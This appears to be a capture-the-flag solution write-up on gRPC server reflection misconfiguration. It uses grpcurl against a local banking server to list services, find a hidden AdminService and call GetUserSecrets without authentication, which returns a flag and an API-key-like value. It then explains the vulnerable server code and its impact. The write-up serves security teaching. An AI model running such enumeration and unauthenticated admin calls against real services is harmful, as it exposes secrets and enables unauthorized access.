# Solution

## The Bug

This challenge demonstrates **gRPC Server Reflection misconfiguration**

Server reflection allows clients to dynamically discover services, methods, and schemas without having `.proto` files. While useful for development, **enabling reflection in production exposes your entire API surface**, including internal-only services.

## Discovery

Check if reflection is enabled:

```bash
grpcurl -plaintext localhost:50051 list
```

**Result:**
```
bank.AdminService
bank.BankingService
grpc.reflection.v1alpha.ServerReflection
```

The server exposes an undocumented `bank.AdminService`!

List its methods:

```bash
grpcurl -plaintext localhost:50051 list bank.AdminService
```

**Result:**
```
bank.AdminService.ExecuteCommand
bank.AdminService.GetUserSecrets
bank.AdminService.ListAllAccounts
```

## The Exploit

Call the admin method directly:

```bash
grpcurl -plaintext -d '{"username": "admin"}' \
  localhost:50051 bank.AdminService/GetUserSecrets
```

**Result:**
```json
{
  "username": "admin",
  "apiKey": "sk_live_51HxK2jL9m3n4o5p6",
  "internalNotes": "System administrator account",
  "flag": "FLAG{grpc_reflection_exposes_hidden_services_4f8a2c}"
}
```

Success! Retrieved the flag, API key, and internal notes - all without authentication.

## Why This Works

Looking at the vulnerable code in `server.py:136-143`:

```python
# Register AdminService on same port as public API
bank_pb2_grpc.add_AdminServiceServicer_to_server(
    AdminServiceServicer(), server
)

# Enable reflection - exposes all services
reflection.enable_server_reflection(SERVICE_NAMES, server)
```

The developer made two mistakes:
1. **Enabled reflection in production** - Should only be in development
2. **Registered AdminService on same port** - Should be separate internal network

## Real-World Impact

Real applications have been vulnerable to this:

- **API reconnaissance**: Attackers map entire API surface, including internal endpoints
- **Privilege escalation**: Admin methods become accessible without authentication
- **Secret exposure**: API keys, tokens, and internal data leaked through debug services


